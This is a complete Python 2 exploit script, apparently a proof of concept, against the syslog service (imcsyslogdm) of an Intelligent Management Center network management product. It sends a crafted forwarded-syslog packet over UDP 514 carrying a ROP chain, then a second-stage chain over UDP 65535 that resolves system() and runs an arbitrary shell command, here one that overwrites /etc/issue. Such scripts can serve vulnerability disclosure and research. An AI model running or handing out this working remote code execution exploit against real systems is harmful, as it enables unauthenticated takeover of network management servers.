#!/usr/bin/env python2
import socket
import struct

IP = '192.168.0.20'
PORT = 514
# the command to execute
command = 'echo "OK GOOGLE!" > /etc/issue ; #\0'

# port to use for the second stage payload, this is created during normal operation
# of the application, we just reuse it because there's no other thread waiting on it
# like in the case of the initial udp/514 vector, which could interfere with sending
# the second stage
PORT_SECOND_STAGE = 65535

# markers used for forwarded syslog messages
SYSLOG_FORWARD_HEAD = 'Forwarded From:'
SYSLOG_FORWARD_HEAD_END = 'Quidview'


def rop(*args):
    return struct.pack('I' * len(args), *args)


# mock object of the ELF class from pwntools so that the final exploit doesn't depend on it
class ELF:
    def bss(self, offset):
        return 0x884D0C0 + offset

    plt = {
        'read': 0x805957C,
        'dlopen': 0x805857C,
        'dlsym': 0x80597BC,
    }


e = ELF()

# strings used in the second stage
libc_str = 'libc.so.6\0'
system_str = 'system\0'

# ROP gadgets from, the latest available version:
#   (Intelligent Management Center Enterprise (7.2_E0403) with E0403P10 applied
# [root@vm bin]# md5sum imcsyslogdm
# 8b06adbd3d47a372358d9106e659d9b2  imcsyslogdm
pop2_ret = 0x0805b137       # pop edi ; pop ebp ; ret
pop3_ret = 0x08480408       # pop edi ; pop ebx ; pop ebp ; ret
pop4_ret = 0x084f213a       # pop edi ; pop esi ; pop ebx ; pop ebp ; ret

zero_edx = 0x084f90c1       # xor edx, edx ; ret
inc_edx = 0x0811c5e6        # inc edx ; ret
pop_ebx = 0x080dd8cd        # pop ebx ; ret

# used to write values obtained dynamically by the ROP chain to the stack
eax_to_stack = 0x08703fba   # mov dword ptr [esp + edx*8], eax ; adc dword ptr [ebx], eax ; ret

ret = 0x080485c0            # ret
add_eax_28 = 0x084ddd16     # add eax, 0x1c ; pop ebp ; ret
dec_eax = 0x080dd660        # dec eax ; ret
zero_eax = 0x080834d4       # xor eax, eax ; ret
add_eax_25f = 0x0845f636    # add eax, 0x25f ; pop ebx ; pop ebp ; ret
ret_C = 0x0814b04e          # ret 0xc
xchg_eax_esp = 0x0807a2c7   # xchg eax, esp ; ret
pop_eax = 0x0837db70        # pop eax ; ret
get_instance = 0x08091210   # ::instance of a Singleton used to retrieve a socket fd
mov_eax_eax_plus_0x5c = 0x08562d44  # mov eax, dword ptr [eax + 0x5c] ; ret


# the offset of the second stage into the .bss
second_stage_offset_into_bss = 0x6500
second_stage_data = libc_str + system_str + command
# place the data above the rop chain so that the stack usage of functions
# won't clobber it. Also, the second ROP chain has to be shorter than this.
second_stage_data_offset = 120

# the length of the command to be executed is limited to around 470 bytes
assert len(command) < 0x25f - second_stage_data_offset - len(system_str) - len(libc_str)

# the first stage has to be 0-byte free, so we do as little as possible here to read in a second stage
first_stage = rop(
    # the stack write gadget (`eax_to_stack` above) writes eax to [esp + edx*8]
    zero_edx,
    inc_edx,
    inc_edx,
    inc_edx,
    inc_edx,
    inc_edx,
    inc_edx,
    inc_edx,
    inc_edx,
    pop_ebx,
    # points somewhere in the bss, just needs to be writable for the eax_to_stack gadget
    e.bss(0x5fc0),

    # the second stage goes to udp/65535, which the application binds but doesn't
    # seem to use for anything. The only thing not completely deterministic in the exploit
    # is the fd number of this port, which seems to be quite reliably 27 but sometimes 28.
    # We get its fd from a class member, and we get the class via a singleton ::instance function.
    # [root@vm bin]# lsof | grep syslog | grep UDP | grep 65535
    # imcsyslog 24741      root   27u     IPv4           39655685       0t0        UDP *:65535
    get_instance,
    mov_eax_eax_plus_0x5c,
    eax_to_stack,                   # write the handle to the stack

    # write the read count to the stack
    zero_edx,
    inc_edx,
    inc_edx,
    inc_edx,
    inc_edx,

    zero_eax,
    add_eax_25f,
    # picked up by the above into ebx, written to by eax_to_stack, just needs to be writable
    e.bss(second_stage_offset_into_bss - 0x80),
    0x41414141,
    eax_to_stack,  # write the handle to the stack
    ret_C,
    e.plt['read'],
    0x41414141, 0x41414141, 0x41414141,
    pop3_ret,
    0x41414141,     # placeholder for the fd of udp/65535
    e.bss(second_stage_offset_into_bss),
    0x41414141,     # placeholder for the read count
    pop_eax,
    e.bss(second_stage_offset_into_bss),
    xchg_eax_esp
)
assert '\0' not in first_stage

print('* Sending first stage to udp/514')
# print repr(first_stage)
s_514 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s_514.sendto(SYSLOG_FORWARD_HEAD + 'A'*48 + first_stage + '\0',
             (IP, PORT))
s_514.close()

# the second stage does a dlopen/dlsym to get the address of the system function,
# then executes the given command via it.
second_stage = rop(
    e.plt['dlopen'],                # get libc handle
    pop2_ret,
    e.bss(second_stage_offset_into_bss + second_stage_data_offset),
    2,                              # RTLD_NOW (why not)

    # write the returned handle to the stack
    zero_edx,
    inc_edx,
    pop_ebx,
    e.bss(second_stage_offset_into_bss - 0x80),                   # somewhere in the bss
    eax_to_stack,                   # write the handle to the stack
    e.plt['dlsym'],
    pop2_ret,
    0x41516171,                     # placeholder, libc handle is written here
    e.bss(second_stage_offset_into_bss + second_stage_data_offset + len(libc_str)),      # address is 'system' string

    # write the returned address to the stack
    zero_edx,
    inc_edx,
    pop_ebx,
    e.bss(second_stage_offset_into_bss - 0x80),                   # somewhere in the bss
    eax_to_stack,                   # write the handle to the stack
    ret,
    ret,
    0x51617181,                     # placeholder, the address of system gets written here
    0x854ae76,                      # continuation of execution: a simple infinite loop of 0xeb 0xfe
    e.bss(second_stage_offset_into_bss + second_stage_data_offset + len(libc_str) + len(system_str))
)

print('* Sending second stage to udp/65535')
# print repr(second_stage)
second_stage_final = second_stage.ljust(second_stage_data_offset) + second_stage_data
s_65535 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s_65535.sendto(second_stage_final.ljust(0x25f), (IP, PORT_SECOND_STAGE))
s_65535.close()
print('! Done.')